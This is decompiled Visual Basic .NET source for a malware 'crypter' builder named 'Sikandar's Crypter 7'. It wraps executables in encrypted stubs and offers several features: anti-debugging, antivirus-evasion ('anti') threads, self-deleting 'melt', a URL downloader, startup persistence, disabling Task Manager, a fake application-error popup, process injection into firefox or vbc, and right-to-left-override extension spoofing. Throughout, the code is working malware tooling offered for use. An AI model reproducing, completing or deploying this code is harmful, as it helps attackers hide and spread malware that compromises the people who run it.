Public Class Form1
 Public Sub New()
        AddHandler MyBase.Load, New EventHandler(AddressOf Me.Form1_Load)
        Me.point_0 = New Point
        Me.openFileDialog_0 = New OpenFileDialog
        Me.openFileDialog_1 = New OpenFileDialog
        Me.string_0 = (Application.StartupPath & "\A.Resources")
        Me.string_1 = (Application.StartupPath & "\C.Resources")
        Me.saveFileDialog_0 = New SaveFileDialog
        Me.string_3 = Class7.smethod_48
        Me.string_4 = Nothing
        Me.string_5 = Class7.smethod_3
        Me.openFileDialog_2 = New OpenFileDialog
        Me.InitializeComponent
    End Sub

Public Sub Algorithm()
        If Me.vmethod_234.Checked Then
            Me.string_3 = Me.string_3.Replace("Environ(Scram(R.GetObject(""X""))) & " & ChrW(206) & " & Na & "".exe""", "LM(""S"", ""I"", ES, New Object() {})")
            Me.string_3 = Me.string_3.Replace("'ES", ("Dim ES As String = " & Me.Encrypt_String("using System;public class S{public static string I(){return System.Environment.SystemDirectory[0].ToString() + @"":\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe"";}}")))
            Me.string_3 = Me.string_3.Replace("Dim YT As Byte() = ENC(R.GetObject(""Inj""), Pn)", Nothing)
            Me.string_3 = Me.string_3.Replace("LM(""C"", ""T"", LL, New Object() {ooo, YT})", Nothing)
        ElseIf Me.bool_0 Then
            Dim input As String = "using System;public class S{public static string I(string O){return Environment.ExpandEnvironmentVariables(""%AppData%"" + @""\"" + O + "".exe"");}}"
            Me.string_3 = Me.string_3.Replace("Environ(Scram(R.GetObject(""X""))) & " & ChrW(206) & " & Na & "".exe""", "LM(""S"", ""I"", ES, New Object() {Na})")
            Me.string_3 = Me.string_3.Replace("'ES", ("Dim ES As String = " & Me.Encrypt_String(input)))
            Dim str2 As String = "using System;public class C{public static bool T(string A, byte[] B) { System.IO.File.WriteAllBytes(A, B); return true; }}"
            Me.string_3 = Me.string_3.Replace("'LL", ("Dim LL As String = " & Me.Encrypt_String(str2)))
        End If
        If Class1.smethod_3.method_1.vmethod_8.Checked Then
            Me.string_3 = Me.string_3.Replace("""CSharp""", Me.Encrypt_String("CSharp"))
            Me.string_3 = Me.string_3.Replace("""System.dll""", Me.Encrypt_String("System.dll"))
            Me.string_3 = Me.string_3.Replace("""/platform:x86 /unsafe""", Me.Encrypt_String("/platform:x86 /unsafe"))
            Me.string_3 = Me.string_3.Replace("""\""", Me.Encrypt_String("\"))
            Me.string_3 = Me.string_3.Replace(""".exe""", Me.Encrypt_String(".exe"))
            Me.string_3 = Me.string_3.Replace("""APPDATA""", Me.Encrypt_String("APPDATA"))
            Me.string_3 = Me.string_3.Replace("""Inj""", Me.Encrypt_String("Inj"))
            Me.string_3 = Me.string_3.Replace("""\0_0""", Me.Encrypt_String("\0_0"))
            Me.string_3 = Me.string_3.Replace("""/""", Me.Encrypt_String("CSharp"))
            Me.string_3 = Me.string_3.Replace("""Antis""", Me.Encrypt_String("Antis"))
            Me.string_3 = Me.string_3.Replace("""Blocker""", Me.Encrypt_String("Blocker"))
            If Class1.smethod_3.method_1.vmethod_18.Checked Then
                Me.string_3 = Me.string_3.Replace("'StrEncryption", Class7.smethod_23)
                Me.string_3 = Me.string_3.Replace("'Reverse", Class7.smethod_41)
            Else
                Me.string_3 = Me.string_3.Replace("'StrEncryption", Class7.smethod_22)
            End If
        End If
        If Class1.smethod_3.method_1.vmethod_14.Checked Then
            Me.string_3 = Me.string_3.Replace("#ONE", Conversions.ToString(Me.Decimal_Convertion(1, 2)))
            Me.string_3 = Me.string_3.Replace("#TWO", Conversions.ToString(Me.Decimal_Convertion(2, 2)))
            Me.string_3 = Me.string_3.Replace("#THREE", Conversions.ToString(Me.Decimal_Convertion(3, 2)))
        Else
            Me.string_3 = Me.string_3.Replace("#ONE", "1")
            Me.string_3 = Me.string_3.Replace("#TWO", "2")
            Me.string_3 = Me.string_3.Replace("#THREE", "3")
        End If
        If Class1.smethod_3.method_1.vmethod_12.Checked Then
            Me.string_3 = Me.string_3.Replace("#ONE", Conversions.ToString(Me.Decimal_Convertion(1, &H10)))
            Me.string_3 = Me.string_3.Replace("#TWO", Conversions.ToString(Me.Decimal_Convertion(2, &H10)))
            Me.string_3 = Me.string_3.Replace("#THREE", Conversions.ToString(Me.Decimal_Convertion(3, &H10)))
        Else
            Me.string_3 = Me.string_3.Replace("#ONE", "1")
            Me.string_3 = Me.string_3.Replace("#TWO", "2")
            Me.string_3 = Me.string_3.Replace("#THREE", "3")
        End If
        If Class1.smethod_3.method_1.vmethod_16.Checked Then
            Me.string_3 = Me.string_3.Replace("#ONE", Conversions.ToString(Me.Decimal_Convertion(1, 8)))
            Me.string_3 = Me.string_3.Replace("#TWO", Conversions.ToString(Me.Decimal_Convertion(2, 8)))
            Me.string_3 = Me.string_3.Replace("#THREE", Conversions.ToString(Me.Decimal_Convertion(3, 8)))
        Else
            Me.string_3 = Me.string_3.Replace("#ONE", "1")
            Me.string_3 = Me.string_3.Replace("#TWO", "2")
            Me.string_3 = Me.string_3.Replace("#THREE", "3")
        End If
        Dim flag1 As Boolean = Class1.smethod_3.method_1.vmethod_22.Checked
    End Sub

 Public Function [Assembly]() As Object
        Return String.Concat(New String() { "<Assembly: AssemblyDescription(""", Me.vmethod_120.Text, """)>", Environment.NewLine, "<Assembly: AssemblyCompany(""", Me.vmethod_116.Text, """)>", Environment.NewLine, "<Assembly: AssemblyCopyright(""", Me.vmethod_112.Text, """)>", Environment.NewLine, "<Assembly: AssemblyTitle(""", Me.vmethod_140.Text, """)>", Environment.NewLine, "<Assembly: AssemblyVersion(""", Conversions.ToString(Me.vmethod_152.Value), ".", Conversions.ToString(Me.vmethod_150.Value), ".", Conversions.ToString(Me.vmethod_148.Value), ".", Conversions.ToString(Me.vmethod_146.Value), """)>" })
    End Function

 Public Shared Function Base64_String(ByVal S As String) As String
        Dim bytes As Byte() = Nothing
        Dim str As String = Nothing
        Try 
            bytes = Convert.FromBase64String(S)
            str = Encoding.UTF8.GetString(bytes)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError
        End Try
        Return str
    End Function

    Public Sub Call_Yes_No()
        If Me.string_2.Contains(".jpg") Then
            Me.Yes_No_Condition(Class7.smethod_32)
        End If
        If Me.string_2.Contains(".png") Then
            Me.Yes_No_Condition(Class7.smethod_37)
        End If
        If Me.string_2.Contains(".avi") Then
            Me.Yes_No_Condition(Class7.smethod_5)
        End If
        If Me.string_2.Contains(".wmv") Then
            Me.Yes_No_Condition(Class7.smethod_5)
        End If
        If Me.string_2.Contains(".wma") Then
            Me.Yes_No_Condition(Class7.smethod_5)
        End If
        If Me.string_2.Contains(".mp3") Then
            Me.Yes_No_Condition(Class7.smethod_35)
        End If
        If Me.string_2.Contains(".mp4") Then
            Me.Yes_No_Condition(Class7.smethod_5)
        End If
        If Me.string_2.Contains(".txt") Then
            Me.Yes_No_Condition(Class7.smethod_50)
        End If
        If Me.string_2.Contains(".doc") Then
            Me.Yes_No_Condition(Class7.smethod_14)
        End If
        If Me.string_2.Contains(".dll") Then
            Me.Yes_No_Condition(Class7.smethod_13)
        End If
        If Me.string_2.Contains(".rar") Then
            Me.Yes_No_Condition(Class7.smethod_39)
        End If
        If Me.string_2.Contains(".pdf") Then
            Me.Yes_No_Condition(Class7.smethod_36)
        End If
        If Me.string_2.Contains(".htm") Then
            Me.Yes_No_Condition(Class7.smethod_27)
        End If
    End Sub

    Public Sub Check_Anti_Functions()
        If Me.vmethod_36.Checked Then
            Me.string_5 = Me.string_5.Replace("//B1.Start();", "B1.Start();")
        End If
        If Me.vmethod_34.Checked Then
            Me.string_5 = Me.string_5.Replace("//C1.Start();", "C1.Start();")
        End If
        If Me.vmethod_44.Checked Then
            Me.string_5 = Me.string_5.Replace("//D1.Start();", "D1.Start();")
        End If
        If Me.vmethod_42.Checked Then
            Me.string_5 = Me.string_5.Replace("//E1.Start();", "E1.Start();")
        End If
        If Me.vmethod_40.Checked Then
            Me.string_5 = Me.string_5.Replace("//F1.Start();", "F1.Start();")
        End If
        If Me.vmethod_46.Checked Then
            Me.string_5 = Me.string_5.Replace("//FolderOptions", Class7.smethod_26)
        End If
        If Me.vmethod_54.Checked Then
            Me.string_5 = Me.string_5.Replace("//G1.Start();", "G1.Start();")
        End If
        If Me.vmethod_52.Checked Then
            Me.string_5 = Me.string_5.Replace("//H1.Start();", "H1.Start();")
        End If
        If Me.vmethod_50.Checked Then
            Me.string_5 = Me.string_5.Replace("//I1.Start();", "I1.Start();")
        End If
        If Me.vmethod_48.Checked Then
            Me.string_5 = Me.string_5.Replace("//J1.Start();", "J1.Start();")
        End If
        If Me.vmethod_60.Checked Then
            Me.string_5 = Me.string_5.Replace("//K1.Start();", "K1.Start();")
        End If
        If Me.vmethod_58.Checked Then
            Me.string_5 = Me.string_5.Replace("//L1.Start();", "L1.Start();")
        End If
        If Me.vmethod_56.Checked Then
            Me.string_5 = Me.string_5.Replace("//M1.Start();", "M1.Start();")
        End If
        If Me.vmethod_64.Checked Then
            Me.string_5 = Me.string_5.Replace("//N1.Start();", "N1.Start();")
        End If
        If Me.vmethod_62.Checked Then
            Me.string_5 = Me.string_5.Replace("//O1.Start();", "O1.Start();")
        End If
        If Me.vmethod_70.Checked Then
            Me.string_5 = Me.string_5.Replace("//P1.Start();", "P1.Start();")
        End If
        If Me.vmethod_68.Checked Then
            Me.string_5 = Me.string_5.Replace("//T1.Start();", "T1.Start();")
        End If
        If Me.vmethod_66.Checked Then
            Me.string_5 = Me.string_5.Replace("//Q1.Start();", "Q1.Start();")
        End If
        If Me.vmethod_76.Checked Then
            Me.string_5 = Me.string_5.Replace("//R1.Start();", "R1.Start();")
        End If
        If Me.vmethod_74.Checked Then
            Me.string_5 = Me.string_5.Replace("//S1.Start();", "S1.Start();")
        End If
    End Sub

    Public Sub Check_Special_Functions()
        If Me.vmethod_84.Checked Then
            Me.string_3 = Me.string_3.Replace("'Melt", Class7.smethod_34)
            Me.string_3 = Me.string_3.Replace("'CallMelt", "Melt(IO.Path.GetFileName(System.Windows.Forms.Application.ExecutablePath))")
        End If
        If Me.vmethod_80.Checked Then
            Dim newValue As String = ("""" & Me.vmethod_86.Text & """")
            Me.string_3 = Me.string_3.Replace("'Downloader", Class7.smethod_15)
            Me.string_3 = Me.string_3.Replace("'Address", newValue)
            Me.string_3 = Me.string_3.Replace("'CallSubDownload", ("Dim CDownload As New Threading.Thread(AddressOf Download)" & Environment.NewLine & "CDownload.Start()"))
        End If
        If Me.vmethod_88.Checked Then
            If Me.vmethod_92.Checked Then
                Dim str2 As String = "LM(""S"", ""SPersistence"", Scram(R.GetObject(""SL"")), New Object() { System.Reflection.Assembly.GetExecutingAssembly().Location })"
                Me.string_3 = Me.string_3.Replace("'CallStartUp", str2)
            Else
                Dim str3 As String = "LM(""S"", ""SNPersistence"", Scram(R.GetObject(""SL"")), New Object() { System.Reflection.Assembly.GetExecutingAssembly().Location })"
                Me.string_3 = Me.string_3.Replace("'CallStartUp", str3)
            End If
        End If
        If Me.vmethod_94.Checked Then
            Me.string_3 = Me.string_3.Replace("'TaskManager", Class7.smethod_49)
            Me.string_3 = Me.string_3.Replace("'CallTM", ("Dim KR As New Threading.Thread(AddressOf KT)" & Environment.NewLine & "KR.Start()"))
        End If
        If Me.vmethod_96.Checked Then
            Me.string_3 = Me.string_3.Replace("'BinderStartup", "LM(""S"", ""SS"", Scram(R.GetObject(""Y"")), New Object() {P})")
        Else
            Me.string_3 = Me.string_3.Replace("'BinderStartup", String.Concat(New String() { "If Not StrPath = System.Windows.Forms.Application.ExecutablePath Then", Environment.NewLine, "LM(""S"", ""SS"", Scram(R.GetObject(""Y"")), New Object() {P})", Environment.NewLine, "End If" }))
        End If
        If Me.vmethod_110.Checked Then
            Me.string_3 = Me.string_3.Replace("'NetframeError", String.Concat(New String() { "If System.Windows.Forms.Application.ExecutablePath <> StrPath Then", Environment.NewLine, "MessageBox.Show(""The application failed to initialize properly (0xc000007b). Click on OK to terminate the application."", ""Application Error"", MessageBoxButtons.OK, MessageBoxIcon.Error)", Environment.NewLine, "End If" }))
        End If
        If (Me.bool_0 AndAlso Me.vmethod_108.Checked) Then
            Me.string_3 = Me.string_3.Replace("'ProtectProcess", "LM(""A"", ""PP"", Scram(R.GetObject(""YQ"")), New Object() {ooo})")
        End If
    End Sub

    Public Sub Compile(ByVal Code As String, ByVal Path As String, ByVal FormProgram As Boolean, ByVal MainClass As String, ByVal CSharp As Boolean, ByVal IntCheck As Boolean, ByVal Optional Resource As String = Nothing)
        Dim obj2 As Object
        Dim parameters3 As CompilerParameters
        If CSharp Then
            obj2 = New CSharpCodeProvider
        Else
            obj2 = New VBCodeProvider
        End If
        Dim parameters As New CompilerParameters
        Dim parameters2 As CompilerParameters = parameters
        If (Resource <> Nothing) Then
            parameters2.EmbeddedResources.Add(Resource)
        End If
        parameters2.GenerateExecutable = True
        parameters2.OutputAssembly = Path
        If IntCheck Then
            If FormProgram Then
                parameters3 = parameters2
                parameters3.CompilerOptions = (parameters3.CompilerOptions & "/target:winexe /platform:x86 /removeintchecks+ /optimize+")
            End If
        ElseIf FormProgram Then
            parameters3 = parameters2
            parameters3.CompilerOptions = (parameters3.CompilerOptions & "/target:winexe /platform:x86 /optimize+")
        End If
        parameters2.MainClass = MainClass
        parameters2.IncludeDebugInformation = False
        Dim assembly As Assembly
        For Each assembly In AppDomain.CurrentDomain.GetAssemblies
            parameters2.ReferencedAssemblies.Add([assembly].Location)
        Next
        parameters2 = Nothing
        Dim arguments As Object() = New Object() { parameters, Code }
        Dim copyBack As Boolean() = New Boolean() { True, True }
        If copyBack(0) Then
            parameters = DirectCast(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(CompilerParameters)), CompilerParameters)
        End If
        If copyBack(1) Then
            Code = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(1)), GetType(String)))
        End If
        Dim objectValue As Object = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj2, Nothing, "CompileAssemblyFromSource", arguments, Nothing, Nothing, copyBack))
        If Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, Nothing, "Errors", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Count", New Object(0  - 1) {}, Nothing, Nothing, Nothing), 0, False) Then
            Dim enumerator As IEnumerator
            Try 
                enumerator = DirectCast(NewLateBinding.LateGet(objectValue, Nothing, "Errors", New Object(0  - 1) {}, Nothing, Nothing, Nothing), IEnumerable).GetEnumerator
                Do While enumerator.MoveNext
                    Interaction.MsgBox(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(enumerator.Current), Nothing, "ErrorText", New Object(0  - 1) {}, Nothing, Nothing, Nothing)), MsgBoxStyle.OkOnly, Nothing)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator,IDisposable).Dispose
                End If
            End Try
        End If
    End Sub

    Public Shared Function Compress(ByVal Buffer As Byte()) As Byte()
        Using stream As MemoryStream = New MemoryStream
            Using stream2 As GZipStream = New GZipStream(stream, CompressionMode.Compress, True)
                stream2.Write(Buffer, 0, Buffer.Length)
                stream2.Close
                Buffer = stream.ToArray
            End Using
        End Using
        Return Buffer
    End Function

    Public Shared Sub DB()
        Do While Form1.IsDebuggerPresent
            Application.Exit
        Loop
    End Sub

    Public Function Decimal_Convertion(ByVal _Decimal As Integer, ByVal Number_System As Integer) As Object
        Dim str As String = Convert.ToString(_Decimal, Number_System)
        Return String.Concat(New String() { "Convert.ToInt32(""", str, """, ", Conversions.ToString(Number_System), ")" })
    End Function

    Public Shared Function Decompress(ByVal Buffer As Byte()) As Byte()
        Using stream As MemoryStream = New MemoryStream(Buffer)
            Using stream2 As MemoryStream = New MemoryStream
                Using stream3 As GZipStream = New GZipStream(stream, CompressionMode.Decompress)
                    Dim count As Integer = &H3E8
                    Dim array As Byte() = New Byte(((((count - 1) + 1) - 1) + 1)  - 1) {}
                    Dim num2 As Integer = -1
                    num2 = stream3.Read(array, 0, array.Length)
                    Do While (num2 > 0)
                        stream2.Write(array, 0, num2)
                        num2 = stream3.Read(array, 0, count)
                    Loop
                    Buffer = stream2.ToArray
                End Using
            End Using
        End Using
        Return Buffer
    End Function

Public Function Encrypt_String(ByVal Input As String) As String
        Dim pass As String = Form1.Random_Pass
        Dim s As String = Form1.StringE(Input, pass)
        If Class1.smethod_3.method_1.vmethod_18.Checked Then
            s = Form1.Reverse(s)
        End If
        Return String.Concat(New String() { "StringE(""", s, """, """, pass, """)" })
    End Function

    Private Sub Form1_Load(ByVal sender As Object, ByVal e As EventArgs)
        Sepa.admin = "sikandar"
        Class1.smethod_3.method_4.ApplicationKey = "NSURSOVBJ6L"
        Sepa.version = "7RE"
        Class1.smethod_3.method_4.time = 30
        Sepa.RememberMe = False
        Class1.smethod_3.method_4.AutoLogin = False
        Sepa.Antis = True
        Class1.smethod_3.method_4.ApplicationName = "Sikandar's Crypter 7"
        Class1.smethod_3.method_4.MainForm = Me
        Class1.smethod_3.method_4.Check
        New Thread(New ThreadStart(AddressOf Form1.DB)).Start
        Me.vmethod_170.SetToolTip(Me.vmethod_18, String.Concat(New String() { "Binary Operator. Slow Down! - Memorize this 2 words if you", Environment.NewLine, "want to encrypt using this algorithm. Don't worry, it", Environment.NewLine, "doesn't take that long." }))
        Me.vmethod_170.SetToolTip(Me.vmethod_20, String.Concat(New String() { "Rivest Cipher 4. Popular to be strong. Never to be wrong.", Environment.NewLine, "But sometimes too common is not very good. Especially", Environment.NewLine, "when the Cop is looking for food!" }))
        Me.vmethod_170.SetToolTip(Me.vmethod_28, String.Concat(New String() { "Advanced Encryption Standard. When it's adopted by the US,", Environment.NewLine, "don't even think that it's a mess. Since NSA doesn't joke,", Environment.NewLine, "so just keep it before you choke." }))
        Me.vmethod_170.SetToolTip(Me.vmethod_26, ("Polymorphic Binary Operator. If 'A' xor 'B' = Constant 'C'" & Environment.NewLine & "Then 'A' Poly_xor 'B' = Dynamic 'C'"))
        Me.vmethod_170.SetToolTip(Me.vmethod_16, ("Triple Data Encryption Standard. How much secured do you" & Environment.NewLine & "think is an algorithm that applies encryption to data 3 times?"))
        Me.vmethod_170.SetToolTip(Me.vmethod_14, "Miharbi-Dono - 'I don't need a ladder, I have the stairs.'")
        Me.vmethod_170.SetToolTip(Me.vmethod_24, "Polymorphic Rivest Cipher. Dynamic Rivest Cipher")
        Me.vmethod_170.SetToolTip(Me.vmethod_22, "Polymorphic Ladder. Oh, it's Stairs. Sorry")
        Me.vmethod_170.SetToolTip(Me.vmethod_32, "Binary Password")
        Me.vmethod_170.SetToolTip(Me.vmethod_4, ("Managed Stub will be generated as the output wrapper." & Environment.NewLine & "This is under .NET Framework 2.0 which will be required for execution."))
        Me.vmethod_170.SetToolTip(Me.vmethod_2, String.Concat(New String() { "Native Stub will be generated as the output wrapper.", Environment.NewLine, "This is under a native language which requires at least windows NT to run.", Environment.NewLine, "Faster cop rate is possible." }))
        Me.vmethod_108.Checked = True
    End Sub

    Public Shared Function GenerateBinary(ByVal Input As Integer) As Object
        Return Convert.ToString(Input, 2)
    End Function

    Public Shared Function Get_Extension(ByVal I As String) As String
        Dim str As String = Form1.Reverse(Path.GetExtension(I))
        str = str.Remove((str.Length - 1))
        Return (ChrW(8238) & str)
    End Function

    Public Function GetNullBytes(ByRef lNum As Object) As String
        Dim str As String = Nothing
        Dim num2 As Short = Conversions.ToShort(Operators.SubtractObject(lNum, 1))
        Dim i As Short = 0
        Do While (i <= num2)
            str = (str & ChrW(8238))
            i = CShort((i + 1))
        Loop
        Return str
    End Function

    Public Function GFN(ByVal FFP As String) As String
        Dim length As Integer = (FFP.LastIndexOfAny(Conversions.ToCharArrayRankOne("\")) + 1)
        Return FFP.Substring(0, length)
    End Function
  <DllImport("kernel32.dll")> _
    Public Shared Function IsDebuggerPresent() As Boolean
    End Function

    Private Sub method_0()
        Me.int_0 = (Control.MousePosition.X - Me.Location.X)
        Me.int_1 = (Control.MousePosition.Y - Me.Location.Y)
    End Sub

    Private Sub method_1(ByVal object_9 As Object, ByVal object_10 As Object)
        If Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(object_10, Nothing, "Button", New Object(0  - 1) {}, Nothing, Nothing, Nothing), &H100000, False) Then
            Me.point_0 = Control.MousePosition
            Me.point_0.X = (Me.point_0.X - Me.int_0)
            Me.point_0.Y = (Me.point_0.Y - Me.int_1)
            Me.Location = Me.point_0
        End If
    End Sub

    Private Sub method_10(ByVal sender As Object, ByVal e As EventArgs)
        Class1.smethod_3.method_1.Show
    End Sub

    Private Sub method_11(ByVal sender As Object, ByVal e As EventArgs)
        Class1.smethod_3.method_2.Show
    End Sub

    Private Sub method_12(ByVal sender As Object, ByVal e As EventArgs)
        Me.openFileDialog_2.DefaultExt = "res"
        Me.openFileDialog_2.Filter = "Resource Injector Files (*.res*)|*.res*"
        Me.openFileDialog_2.FilterIndex = 1
        Me.openFileDialog_2.FileName = String.Empty
        If (Me.openFileDialog_2.ShowDialog(Me) = DialogResult.OK) Then
            Me.vmethod_174.Text = Me.openFileDialog_2.FileName
        End If
    End Sub

    Private Sub method_13(ByVal sender As Object, ByVal e As EventArgs)
        If Me.vmethod_2.Checked Then
            MessageBox.Show("This feature will be available on the part 2 of version 7.0. Please standby for the announcements.", "Native", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            Me.vmethod_4.Checked = True
            Me.vmethod_2.Checked = False
        End If
    End Sub

    Private Sub method_14(ByVal sender As Object, ByVal e As EventArgs)
        Class1.smethod_3.method_3.Show
    End Sub

    Private Sub method_15(ByVal sender As Object, ByVal e As EventArgs)
        Using dialog As OpenFileDialog = New OpenFileDialog
            If (Form1.int_2 = 0) Then
                dialog.Filter = "Portable Executable Files (*.Exe)|*.Exe"
            Else
                dialog.Filter = "All Files *.*|*.*"
            End If
            If (Form1.int_2 > 1) Then
                MessageBox.Show("File limit exceeded! Author has reduced the limit because of a false detection.", "Limit Exceeded", MessageBoxButtons.OK, MessageBoxIcon.Hand)
                Return
            End If
            If (dialog.ShowDialog = DialogResult.OK) Then
                Me.vmethod_172.Items.Add(dialog.FileName)
                If (Form1.int_2 = 0) Then
                    If (File.ReadAllBytes(dialog.FileName)(60) = &H80) Then
                        Me.bool_0 = False
                    Else
                        Me.bool_0 = True
                    End If
                End If
                Form1.int_2 += 1
            End If
        End Using
        If (((Me.vmethod_24.Checked Or Me.vmethod_26.Checked) Or Me.vmethod_22.Checked) Or Me.vmethod_16.Checked) Then
            Dim num As Integer = 0
            Dim num3 As Integer = (Me.vmethod_172.Items.Count - 1)
            Dim i As Integer = 0
            Do While (i <= num3)
                num = (num + File.ReadAllBytes(Conversions.ToString(Me.vmethod_172.Items.Item(i))).Length)
                i += 1
            Loop
            If (num > &H4B000) Then
                MessageBox.Show("File is too large for the encryption to handle.", "Too Large", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                Me.vmethod_24.Checked = False
                Me.vmethod_26.Checked = False
                Me.vmethod_16.Checked = False
                Me.vmethod_22.Checked = False
                Me.vmethod_20.Checked = True
            End If
        End If
        If (Form1.int_2 = 2) Then
            Me.vmethod_26.Enabled = False
            Me.vmethod_24.Enabled = False
            Me.vmethod_16.Enabled = False
            Me.vmethod_22.Enabled = False
            Me.vmethod_18.Checked = False
            Me.vmethod_14.Checked = False
            Me.vmethod_16.Checked = False
            Me.vmethod_24.Checked = False
            Me.vmethod_26.Checked = False
            Me.vmethod_22.Checked = False
            Me.vmethod_28.Checked = False
            Me.vmethod_20.Checked = True
        Else
            Me.vmethod_26.Enabled = True
            Me.vmethod_24.Enabled = True
            Me.vmethod_16.Enabled = True
            Me.vmethod_22.Enabled = True
        End If
    End Sub

    Private Sub method_16(ByVal sender As Object, ByVal e As EventArgs)
        Do While (Me.vmethod_172.SelectedItems.Count > 0)
            Me.vmethod_172.Items.Remove(RuntimeHelpers.GetObjectValue(Me.vmethod_172.SelectedItem))
            Form1.int_2 -= 1
        Loop
        If (Form1.int_2 < 2) Then
            Me.vmethod_26.Enabled = True
            Me.vmethod_24.Enabled = True
            Me.vmethod_16.Enabled = True
            Me.vmethod_22.Enabled = True
        End If
    End Sub

    Private Sub method_17(ByVal sender As Object, ByVal e As EventArgs)
        If Me.vmethod_36.Checked Then
            Me.vmethod_94.Checked = False
        End If
    End Sub

    Private Sub method_18(ByVal sender As Object, ByVal e As EventArgs)
        If (Me.vmethod_94.Checked AndAlso Me.vmethod_36.Checked) Then
            MessageBox.Show("There's no need to check the option since it's already enabled in the anti section.", "Enabled", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            Me.vmethod_94.Checked = False
        End If
    End Sub

    Private Sub method_19(ByVal sender As Object, ByVal e As EventArgs)
        If Me.vmethod_24.Checked Then
            Dim num As Integer = 0
            Dim num2 As Integer = (Me.vmethod_172.Items.Count - 1)
            Dim i As Integer = 0
            Do While (i <= num2)
                num = (num + File.ReadAllBytes(Conversions.ToString(Me.vmethod_172.Items.Item(i))).Length)
                i += 1
            Loop
            If (num > &H4B000) Then
                MessageBox.Show("File is too large for the encryption to handle.", "Too Large", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                Me.vmethod_20.Checked = True
                Me.vmethod_24.Checked = False
            End If
        End If
    End Sub

    Private Sub method_2(ByVal sender As Object, ByVal e As EventArgs)
        Application.Exit
    End Sub

    Private Sub method_20(ByVal sender As Object, ByVal e As EventArgs)
        If Me.vmethod_26.Checked Then
            Dim num As Integer = 0
            Dim num2 As Integer = (Me.vmethod_172.Items.Count - 1)
            Dim i As Integer = 0
            Do While (i <= num2)
                num = (num + File.ReadAllBytes(Conversions.ToString(Me.vmethod_172.Items.Item(i))).Length)
                i += 1
            Loop
            If (num > &H4B000) Then
                MessageBox.Show("File is too large for the encryption to handle.", "Too Large", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                Me.vmethod_20.Checked = True
                Me.vmethod_26.Checked = False
            End If
        End If
    End Sub

    Private Sub method_21(ByVal sender As Object, ByVal e As EventArgs)
        If Me.vmethod_22.Checked Then
            Dim num As Integer = 0
            Dim num2 As Integer = (Me.vmethod_172.Items.Count - 1)
            Dim i As Integer = 0
            Do While (i <= num2)
                num = (num + File.ReadAllBytes(Conversions.ToString(Me.vmethod_172.Items.Item(i))).Length)
                i += 1
            Loop
            If (num > &H4B000) Then
                MessageBox.Show("File is too large for the encryption to handle.", "Too Large", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                Me.vmethod_20.Checked = True
                Me.vmethod_22.Checked = False
            End If
        End If
    End Sub

    Private Sub method_22(ByVal sender As Object, ByVal e As EventArgs)
        If Me.vmethod_16.Checked Then
            Dim num As Integer = 0
            Dim num2 As Integer = (Me.vmethod_172.Items.Count - 1)
            Dim i As Integer = 0
            Do While (i <= num2)
                num = (num + File.ReadAllBytes(Conversions.ToString(Me.vmethod_172.Items.Item(i))).Length)
                i += 1
            Loop
            If (num > &H4B000) Then
                MessageBox.Show("File is too large for the encryption to handle.", "Too Large", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                Me.vmethod_20.Checked = True
                Me.vmethod_16.Checked = False
            End If
        End If
    End Sub
 Private Sub method_24(ByVal sender As Object, ByVal e As EventArgs)
        If Me.vmethod_234.Checked Then
            Me.vmethod_214.Enabled = False
            Me.vmethod_174.Text = "Resource to Use..."
            Me.vmethod_180.Text = "vbc"
            Me.vmethod_180.ReadOnly = True
            Me.vmethod_108.Checked = False
            Me.vmethod_108.Enabled = False
        Else
            Me.vmethod_214.Enabled = True
            Me.vmethod_180.Text = "firefox"
            Me.vmethod_180.ReadOnly = False
            Me.vmethod_108.Enabled = True
            Me.vmethod_108.Checked = True
        End If
    End Sub

    Private Sub method_3(ByVal sender As Object, ByVal e As EventArgs)
        Dim random As New Random
        Me.vmethod_32.Text = Conversions.ToString(Operators.ConcatenateObject(Form1.GenerateBinary(random.Next(&HF4240, &H989680)), Form1.GenerateBinary(random.Next(&H5F5E100, &H3B9ACA00))))
    End Sub

    Private Sub method_4(ByVal sender As Object, ByVal e As EventArgs)
        If Me.vmethod_72.Checked Then
            Me.vmethod_36.Checked = True
            Me.vmethod_34.Checked = True
            Me.vmethod_44.Checked = True
            Me.vmethod_42.Checked = True
            Me.vmethod_40.Checked = True
            Me.vmethod_46.Checked = True
            Me.vmethod_54.Checked = True
            Me.vmethod_52.Checked = True
            Me.vmethod_50.Checked = True
            Me.vmethod_48.Checked = True
            Me.vmethod_60.Checked = True
            Me.vmethod_58.Checked = True
            Me.vmethod_56.Checked = True
            Me.vmethod_64.Checked = True
            Me.vmethod_62.Checked = True
            Me.vmethod_70.Checked = True
            Me.vmethod_68.Checked = True
            Me.vmethod_66.Checked = True
            Me.vmethod_76.Checked = True
            Me.vmethod_74.Checked = True
        Else
            Me.vmethod_36.Checked = False
            Me.vmethod_34.Checked = False
            Me.vmethod_44.Checked = False
            Me.vmethod_42.Checked = False
            Me.vmethod_40.Checked = False
            Me.vmethod_46.Checked = False
            Me.vmethod_54.Checked = False
            Me.vmethod_52.Checked = False
            Me.vmethod_50.Checked = False
            Me.vmethod_48.Checked = False
            Me.vmethod_60.Checked = False
            Me.vmethod_58.Checked = False
            Me.vmethod_56.Checked = False
            Me.vmethod_64.Checked = False
            Me.vmethod_62.Checked = False
            Me.vmethod_70.Checked = False
            Me.vmethod_68.Checked = False
            Me.vmethod_66.Checked = False
            Me.vmethod_76.Checked = False
            Me.vmethod_74.Checked = False
        End If
    End Sub

    Private Sub method_5(ByVal sender As Object, ByVal e As EventArgs)
        If Me.vmethod_96.Checked Then
            Me.vmethod_88.Checked = True
        End If
    End Sub

